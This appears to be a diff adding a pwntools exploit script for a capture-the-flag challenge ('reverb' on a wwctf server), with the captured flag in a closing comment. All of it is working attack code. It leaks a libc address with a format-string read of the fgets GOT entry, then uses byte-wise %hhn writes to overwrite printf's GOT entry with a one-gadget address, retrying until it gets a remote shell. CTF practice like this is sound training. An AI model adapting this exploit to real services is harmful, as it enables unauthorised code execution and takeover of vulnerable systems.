@@ -1,0 +1,58 @@
+from pwn import *
+
+e = ELF("./chall_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+
+'''
+p = gdb.debug("./chall_patched", gdbscript = 
+b *main + 227
+)
+'''
+fgets_got = e.got['fgets']
+printf_got = e.got['printf']
+
+while(True):
+    try:
+        p = remote("reverb.chal.wwctf.com", 1337)
+        #p = process("./chall_patched")
+        payload = b"%11$s\x00\x00\x00" + p64(fgets_got)
+        p.sendlineafter(b">> ", payload)
+        libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x7f380
+        print(hex(libc_base))
+
+        one_shot = libc_base + 0xebd43
+
+        l = []
+        for i in range(3):
+            l.append([one_shot & 0xff, i])
+            one_shot = one_shot >> 8
+
+        l = sorted(l, key = lambda x: x[0])
+
+        uoc_tinh = l[0][0] + l[1][0] + l[2][0] + 7 * 3
+        siz = ((uoc_tinh - 1)//8 + 1) * 8
+        offset = siz // 8 + 10
+
+        payload = b""
+        payload += b"c" * l[0][0] + f"%{offset}$hhn".encode()
+        payload += b"c" * (l[1][0] - l[0][0]) + f"%{offset + 1}$hhn".encode()
+        payload += b"c" * (l[2][0] - l[1][0]) + f"%{offset + 2}$hhn".encode()
+        payload = payload.ljust(siz, b"\x00")
+        payload += p64(printf_got + l[0][1]) + p64(printf_got + l[1][1]) + p64(printf_got + l[2][1])
+
+        print(len(payload))
+        p.sendlineafter(b">> ", payload)
+
+        p.sendline("echo vani5hing")
+        p.recvuntil("vani5hing")      
+        break
+    
+    except:
+        try:
+            p.close()
+        except:
+            pass
+
+p.interactive()
+#wwf{truLy_4_frmat_str_m4st3r!}
